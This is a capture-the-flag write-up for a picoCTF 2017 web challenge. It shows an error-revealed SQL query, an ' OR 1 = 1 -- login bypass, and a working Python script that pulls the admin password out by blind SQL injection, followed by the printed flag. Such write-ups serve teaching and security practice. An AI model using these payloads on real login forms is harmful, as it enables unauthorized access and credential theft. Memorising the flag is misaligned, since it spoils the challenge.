# No Eyes
## level 3 - web exploitation - 125 points

### Description
> The [website](http://shell2017.picoctf.com:33838/) isn't really me much, but you can still get the admin password, right?

### Hints
> * Sometimes an error message can be just as useful.

### Solution

Open the website and use `admin` as username and `'` as password, this will trigger an error printing the executed query:

```sql
select * from users where pass = ''';
```

So we can inject arbitrary SQL. Let's try with `' OR 1 = 1 --` as password. It will trigger this error:

```
Login Functionality Not Complete. Flag is 63 characters
```

We actually have passed the password check, but the login function is not implemented. As suggested from the title and the hint we can perform a [blind SQL injection attack](https://www.owasp.org/index.php/Blind_SQL_Injection) on password field. I used Python to automate the process:

```python
import requests, string

URL = 'http://shell2017.picoctf.com:33838/'

characters = ''.join([string.lowercase, string.digits, '_'])
current = ''

for i in range(0, 63 - len(current)):
    for char in characters:
        data = {
            'username': 'admin',
            'password': '\' OR pass LIKE "%s%s%%" --' % (current, char)
        }

        r = requests.post(URL, data=data)
        if 'Login Functionality' in r.text:
            current += char
            print 'Password: %s' % current
            break
    
print 'DONE!'
```

It will try every character until the login is successful, concatenate the letter we found, then pass to the next one. It will run for 63 cycles as said from the login error we saw. It will take some time and probably it will fail: in this case you can copy the last found password (outputted on screen) and paste in line 6 to resume:

```
$ python blind.py
Password: n
Password: no
Password: not
...
Password: not_all_errors_should_be_shown_07fa15beae68af0694171000114ec4
Password: not_all_errors_should_be_shown_07fa15beae68af0694171000114ec41
Password: not_all_errors_should_be_shown_07fa15beae68af0694171000114ec419
DONE!
```

### Flag
```
not_all_errors_should_be_shown_07fa15beae68af0694171000114ec419
```